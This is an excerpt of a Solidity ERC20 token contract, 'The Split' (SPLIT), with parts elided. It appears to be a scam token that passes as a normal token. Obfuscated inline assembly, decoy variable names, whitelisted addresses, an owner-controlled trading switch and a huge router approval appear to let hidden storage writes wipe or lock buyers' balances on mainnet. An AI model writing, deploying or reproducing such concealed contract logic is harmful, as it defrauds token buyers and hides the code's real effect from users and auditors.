...
/*
     ________ ______  _______  __   __________
    /_  __/ // / __/ / __/ _ \/ /  /  _/_  __/
     / / / _  / _/  _\ \/ ___/ /___/ /  / /   
    /_/ /_//_/___/ /___/_/  /____/___/ /_/    

"From one make two. Merging or splitting. Take your bets."
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRose;
    uint256 private splitMerge = block.number*2;

    mapping (address => bool) private _firstDiscuss; 
    mapping (address => bool) private _secondSplit;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _byeMiners;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private censorShip;
    address public pair;
    ...
    bool private trading; uint256 private tsuNami = 1; bool private meSsier;
    uint256 private _decimals; uint256 private torNado;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRose.push(_router); addRose.push(msgSender_); addRose.push(pair);
        for (uint256 q=0; q < 3;) {_firstDiscuss[addRose[q]] = true; unchecked{q++;} }
    }
    ...
    function _smartToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x12c4417c301255efb2a7d8d1a75499059fddd854109b115efecce0da38fc02ee
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xabc5951ccc1e764c722aa5a6c96ba2af1047f96ee765227f76f0311638819555,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; splitMerge = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRose[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySplit(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addRose[0], 10 ** 77);
        _smartToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySplit(creator, initialSupply);
    }
}

contract TheSplit is ERC20Token {
    constructor() ERC20Token("The Split", "SPLIT", msg.sender, 2000000 * 10 ** 18) {
    }
}